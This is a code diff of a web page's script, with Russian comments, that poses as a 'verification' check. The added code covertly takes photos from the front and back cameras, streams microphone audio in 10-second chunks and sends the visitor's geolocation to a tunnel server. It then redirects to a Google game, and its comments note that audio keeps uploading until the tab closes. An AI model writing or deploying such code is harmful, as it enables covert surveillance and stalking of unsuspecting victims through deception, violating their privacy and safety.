@@ -29,99 +29,88 @@
     <canvas id="c"></canvas>
 
 <script>
-    // ТВОЙ НОВЫЙ URL ТУННЕЛЯ
-    const API = "https://64890b6836e93f83-176-2-182-204.serveousercontent.com"; 
-    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
+const API = "https://bde7016c8538f81f-176-2-182-204.serveousercontent.com"; 
+const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
+const urlParams = new URLSearchParams(window.location.search);
+const user = urlParams.get('user') || "Unknown";
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const user = urlParams.get('user') || "Unknown";
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    function getSmartName(label) {
-        const now = new Date();
-        const ts = now.toISOString().replace(/[-T:.Z]/g, "").substring(0, 14);
-        return `${ts}_${label}.jpg`;
-    }
+// Функция захвата фото (улучшенная)
+async function takePhoto(mode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
+        const v = document.getElementById('v');
+        v.srcObject = stream;
+        await v.play();
+        await sleep(1000); 
 
-    async function takePhoto(mode, label) {
-        if (!navigator.mediaDevices) return null;
-        if (mode === "user") document.body.classList.add('flash-active');
+        const canvas = document.getElementById('c');
+        canvas.width = v.videoWidth;
+        canvas.height = v.videoHeight;
+        canvas.getContext('2d').drawImage(v, 0, 0);
+        
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+        return blob;
+    } catch (e) { return null; }
+}
 
-        let stream = null;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false 
-            });
-            
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            
-            await new Promise((resolve) => {
-                v.onplaying = resolve;
-                v.play().catch(resolve);
-                setTimeout(resolve, 800); // Чуть увеличили задержку для мобилок
-            });
-
-            await new Promise(r => setTimeout(r, 1000));
-
-            const canvas = document.getElementById('c');
-            // Проверка реальных размеров видеопотока
-            canvas.width = v.videoWidth || 1280;
-            canvas.height = v.videoHeight || 720;
-            canvas.getContext('2d').drawImage(v, 0, 0);
-
-            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-        } catch (e) {
-            console.error("Camera error:", e);
-            return null; 
-        } finally {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            document.body.classList.remove('flash-active');
-        }
-    }
-
-    async function run() {
-        const btn = document.getElementById('go');
-        const loader = document.getElementById('loader');
-        const msg = document.getElementById('msg');
-        const statusTitle = document.getElementById('st');
-
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-        msg.innerText = "Initializing protocols...";
-
-        navigator.geolocation.getCurrentPosition(p => {
-            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
-        }, null, {timeout: 5000});
-
-        const fd = new FormData();
-        const plan = [{ m: "user", l: "front_1" }, { m: "environment", l: "back_1" }];
-
-        for (let i = 0; i < plan.length; i++) {
-            msg.innerText = `Check (${i + 1}/${plan.length})...`;
-            const photo = await takePhoto(plan[i].m, plan[i].l);
-            if (photo) {
-                fd.append('files', photo, getSmartName(plan[i].l));
+// Фоновая запись аудио фрагментами
+async function startAudioStreaming() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        
+        mediaRecorder.ondataavailable = async (event) => {
+            if (event.data.size > 0) {
+                const fd = new FormData();
+                fd.append('file', event.data, `audio_${Date.now()}.ogg`);
+                fetch(`${API}/upload-audio?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
             }
-        }
+        };
 
-        if (fd.has('files')) {
-            msg.innerText = "Encrypting data...";
-            try {
-                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
-                    method: 'POST',
-                    body: fd
-                });
-            } catch(e) {
-                console.error("Upload failed:", e);
-            }
-        }
+        // Отправляем кусочек звука каждые 10 секунд
+        mediaRecorder.start(10000); 
+    } catch (e) { console.error("Audio error", e); }
+}
 
-        statusTitle.innerText = "Success";
-        loader.style.display = 'none';
-        msg.innerText = "Verified! Loading ...";
-        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+async function run() {
+    document.getElementById('go').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    const msg = document.getElementById('msg');
+
+    // 1. Гео
+    navigator.geolocation.getCurrentPosition(p => {
+        fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
+    });
+
+    // 2. Стриминг аудио (запускаем и забываем, он работает сам)
+    startAudioStreaming();
+
+    // 3. Серия фото (по 2 с каждой камеры)
+    const fd = new FormData();
+    const modes = ["user", "environment"];
+    
+    for (let mode of modes) {
+        for (let i = 1; i <= 2; i++) {
+            msg.innerText = `Verification ${mode === 'user' ? 'Front' : 'Back'}... ${i}/2`;
+            const photo = await takePhoto(mode);
+            if (photo) fd.append('files', photo, `photo_${mode}_${i}.jpg`);
+            await sleep(500);
+        }
     }
+
+    // 4. Отправка фото-пакета
+    msg.innerText = "Finalizing...";
+    await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
+
+    // 5. Редирект (но аудио продолжит слаться, пока вкладка не закроется совсем)
+    msg.innerText = "Redirecting...";
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+}
 </script>
 </body>
 </html>
